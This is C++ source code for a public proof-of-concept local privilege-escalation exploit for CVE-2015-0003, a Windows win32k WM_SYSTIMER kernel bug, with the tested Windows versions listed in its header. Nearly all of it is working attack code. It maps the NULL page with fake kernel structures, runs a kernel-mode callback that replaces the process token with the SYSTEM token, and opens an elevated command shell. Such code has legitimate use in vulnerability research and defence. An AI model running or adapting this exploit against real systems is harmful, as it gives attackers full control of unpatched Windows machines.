// ex.cpp
/*
	Windows XP/2K3/VISTA/2K8/7 WM_SYSTIMER Kernel EoP
	CVE-2015-0003
	March 2015 (Public Release: May 24, 2015)

	Tested on:
				x86: Win 7 SP1 | Win 2k3 SP2 | Win XP SP3
				x64: Win 2k8 SP1 | Win 2k8 R2 SP1

	Author: Skylake - skylake <at> mail <dot> com
*/

#include "ex.h"

_ZwAllocateVirtualMemory ZwAllocateVirtualMemory;
_PsLookupProcessByProcessId PsLookupProcessByProcessId;
_PsReferencePrimaryToken PsReferencePrimaryToken;
DWORD Pid;
ATOM atom;
BOOL KrnlMode, bSpawned;

DWORD_PTR WINAPI pti()
{
#ifdef _M_X64
	LPBYTE p = ( LPBYTE ) __readgsqword( 0x30 );
	return ( DWORD_PTR ) *( ( PDWORD_PTR ) ( p + 0x78 ) );
#else
	LPBYTE p = ( LPBYTE ) __readfsdword( 0x18 );
	return ( DWORD_PTR ) *( ( PDWORD_PTR ) ( p + 0x40 ) );
#endif
}

BOOL find_and_replace_member( PDWORD_PTR pdwStructure, DWORD_PTR dwCurrentValue, DWORD_PTR dwNewValue, DWORD_PTR dwMaxSize )
{
	DWORD_PTR dwIndex, dwMask;

#ifdef _M_X64
	dwMask = ~0xf;
#else
	dwMask = ~7;
#endif
	//
	dwCurrentValue &= dwMask;

	for( dwIndex = 0; dwIndex < dwMaxSize; dwIndex++ )
	{
		if( ( pdwStructure[dwIndex] & dwMask ) == dwCurrentValue )
		{
			//
			pdwStructure[dwIndex] = dwNewValue;
			return TRUE;
		}
	}

	return FALSE;
}

BOOL WINAPI Init()
{
	HMODULE hMod = NULL;
	PVOID Base = NULL;
	OSVERSIONINFO ov = { sizeof( OSVERSIONINFO ) };
	PSYSTEM_MODULE_INFORMATION pm = NULL;
	BOOL RetVal = FALSE;

	__try {

		if( !GetVersionEx( &ov ) ) __leave;

		if( ov.dwMajorVersion == 5 && ov.dwMinorVersion > 0 )
		{
			atom = 0xc039;
		}

		else if( ov.dwMajorVersion == 6 && ov.dwMinorVersion < 2 )
		{
			atom = ( ov.dwMinorVersion == 1 ) ? 0xc03c : 0xc03a;
		}

		if( !atom ) __leave;

		_ZwQuerySystemInformation ZwQuerySystemInformation = ( _ZwQuerySystemInformation ) GetProcAddress( GetModuleHandle( TEXT( "ntdll.dll" ) ), "ZwQuerySystemInformation" );
		if( !ZwQuerySystemInformation ) __leave;

		ZwAllocateVirtualMemory = ( _ZwAllocateVirtualMemory ) GetProcAddress( GetModuleHandle( TEXT( "ntdll.dll" ) ), "ZwAllocateVirtualMemory" );
		if( !ZwAllocateVirtualMemory ) __leave;

		ULONG len;
		LONG status = ZwQuerySystemInformation( SystemModuleInformation, NULL, 0, &len );
		if( !status ) __leave;

		pm = ( PSYSTEM_MODULE_INFORMATION ) LocalAlloc( LMEM_ZEROINIT, len );
		if( !pm ) __leave;
		status = ZwQuerySystemInformation( SystemModuleInformation, pm, len, &len );
		if( status ) __leave;

		CHAR szKrnl[MAX_PATH] = { 0 }, *t;

		for( ULONG i = 0; i < pm->Count; ++i )
		{
			if( strstr( pm->Module[i].ImageName, "exe" ) )
			{
				t = strstr( pm->Module[i].ImageName, "nt" );
				if( t )
				{
					strcpy_s( szKrnl, _countof( szKrnl ) - 1, t );
					Base = pm->Module[i].Base;
					break;
				}
			}
		}

		hMod = LoadLibraryA( szKrnl );

		if( !hMod || !Base ) __leave;
		
		PsLookupProcessByProcessId = ( _PsLookupProcessByProcessId ) GetProcAddress( hMod, "PsLookupProcessByProcessId" );
		if( !PsLookupProcessByProcessId ) __leave;

		PsLookupProcessByProcessId = ( _PsLookupProcessByProcessId ) ( ( DWORD_PTR ) Base + ( ( DWORD_PTR ) PsLookupProcessByProcessId - ( DWORD_PTR ) hMod ) );

		PsReferencePrimaryToken = ( _PsReferencePrimaryToken ) GetProcAddress( hMod, "PsReferencePrimaryToken" );

		if( !PsReferencePrimaryToken ) __leave;

		PsReferencePrimaryToken = ( _PsReferencePrimaryToken ) ( ( DWORD_PTR ) Base + ( ( DWORD_PTR ) PsReferencePrimaryToken - ( DWORD_PTR ) hMod ) );
		Pid = GetCurrentProcessId();
		RetVal = TRUE;
	}

	__finally {
		if( pm ) LocalFree( pm );
		if( hMod ) FreeLibrary( hMod );
	}

	return RetVal;
}

LRESULT CALLBACK ShellCode( HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam )
{
	LPVOID pCurProcess = NULL;
	LPVOID pSystemInfo = NULL;
	PACCESS_TOKEN systemToken;
	PACCESS_TOKEN targetToken;

	PsLookupProcessByProcessId( ( HANDLE ) Pid, &pCurProcess );
	PsLookupProcessByProcessId( ( HANDLE ) 4, &pSystemInfo );

	targetToken = PsReferencePrimaryToken( pCurProcess );
	systemToken = PsReferencePrimaryToken( pSystemInfo );

	//
	find_and_replace_member( ( PDWORD_PTR ) pCurProcess,
		( DWORD_PTR ) targetToken,
		( DWORD_PTR ) systemToken,
		0x200 );
	KrnlMode = TRUE;
	return  0;
}

VOID WINAPI leave()
{
	keybd_event( VK_ESCAPE, 0, 0, NULL );
	keybd_event( VK_ESCAPE, 0, KEYEVENTF_KEYUP, NULL );
	keybd_event( VK_LWIN, 0, KEYEVENTF_KEYUP, NULL );
}

LRESULT CALLBACK WndProc( HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam )
{
	if( bSpawned )
	{
		leave();
		ExitProcess( 0 );
	}

	switch( message )
	{
	case WM_CREATE:
		SetTimer( hWnd, ID_TIMER, 1000 * 3, NULL );
		FlashWindow( hWnd, TRUE );
		keybd_event( VK_LWIN, 0, 0, NULL );
		break;
	case WM_CLOSE:
		DestroyWindow( hWnd );
		break;
	case WM_DESTROY:
		PostQuitMessage( 0 );
		break;
	case WM_TIMER:
		KillTimer( hWnd, ID_TIMER );
		leave();
		DestroyWindow( hWnd );
		break;
	default:
		return DefWindowProc( hWnd, message, wParam, lParam );
	}
	return 0;
}

int APIENTRY _tWinMain( _In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPTSTR    lpCmdLine,
	_In_ int       nCmdShow )
{
	WNDCLASSEX wc = { sizeof( WNDCLASSEX ) };
	HWND hWnd = NULL;
	MSG Msg = { 0 };

	SIZE_T size = 0x1000;
	LPVOID addr = ( LPVOID ) 1;

	if( !Init() ) return 1;
	
	if( ZwAllocateVirtualMemory( ( HANDLE ) -1, &addr, 0, &size, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE ) )
	{
		//
		return 1;
	}

	DWORD_PTR p = pti();
	if( !p ) return 1;

#ifdef _M_X64
	*( ( PDWORD_PTR ) 0x10 ) = p;
	*( ( LPBYTE ) 0x2a ) = 4;
	*( ( LPVOID* ) 0x90 ) = ( LPVOID ) ShellCode;
	*( ( PDWORD_PTR ) 0xa8 ) = 0x400;
	*( ( LPDWORD ) 0x404 ) = 1;
	*( ( PDWORD_PTR ) 0x408 ) = 0x800;
	*( ( LPWORD ) 0x410 ) = atom;
	*( ( LPBYTE ) 0x412 ) = 1;
#else
	*( ( LPDWORD ) 0x08 ) = p;
	*( ( LPBYTE ) 0x16 ) = 4;
	*( ( LPVOID* ) 0x60 ) = ( LPVOID ) ShellCode;
	*( ( LPDWORD ) 0x6c ) = 0x400;
	*( ( LPDWORD ) 0x404 ) = 1;
	*( ( LPDWORD ) 0x408 ) = 0x800;
	*( ( LPWORD ) 0x40c ) = atom;
	*( ( LPBYTE ) 0x40e ) = 1;
#endif

	wc.lpfnWndProc = WndProc;
	wc.hInstance = hInstance;
	wc.lpszClassName = TEXT( "Class" );
	
	if( !RegisterClassEx( &wc ) )
		return 1;
	hWnd = CreateWindowEx(
		WS_EX_CLIENTEDGE,
		TEXT( "Class" ),
		TEXT( "Window" ),
		WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, 200, 100,
		NULL, NULL, hInstance, NULL );
	if( !hWnd )
		return 1;
	ShowWindow( hWnd, SW_HIDE );
	UpdateWindow( hWnd );

	while( GetMessage( &Msg, NULL, 0, 0 ) )
	{
		if ( Msg.message == WM_SYSTIMER ) // Borrowed from http://blog.beyondtrust.com/fuzzing-for-ms15-010
		{
			if( !KrnlMode )
			{
				Msg.hwnd = ( HWND ) NULL;
			}
			else
			{
				Msg.hwnd = hWnd;
				if( !bSpawned )
				{
					ShellExecute( NULL, TEXT( "open" ), TEXT( "cmd.exe" ), NULL, NULL, SW_SHOW );
					bSpawned = TRUE;
				}
			}
		}

		TranslateMessage( &Msg );
		DispatchMessage( &Msg );
	}

	return ( int ) Msg.wParam;
}
// EOF






//ex.h

#pragma once

#include <windows.h>
#include <stdio.h>
#include <tchar.h>

typedef NTSTATUS ( WINAPI *_ZwAllocateVirtualMemory ) (
	_In_    HANDLE    ProcessHandle,
	_Inout_ PVOID     *BaseAddress,
	_In_    ULONG_PTR ZeroBits,
	_Inout_ PSIZE_T   RegionSize,
	_In_    ULONG     AllocationType,
	_In_    ULONG     Protect
	);

typedef NTSTATUS ( WINAPI *_PsLookupProcessByProcessId ) (
	_In_  HANDLE ProcessId,
	_Out_ PVOID  *Process
	);

typedef PACCESS_TOKEN ( WINAPI *_PsReferencePrimaryToken ) (
	_Inout_ PVOID Process
	);

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemModuleInformation = 11
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS ( WINAPI *_ZwQuerySystemInformation ) (
	_In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_   PVOID                    SystemInformation,
	_In_      ULONG                    SystemInformationLength,
	_Out_opt_ PULONG                   ReturnLength
	);

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	HANDLE Section;
	PVOID  MappedBase;
	PVOID  Base;
	ULONG  Size;
	ULONG  Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR   ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG Count;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

#define ID_TIMER    0x1
#define WM_SYSTIMER 0x118
// EOF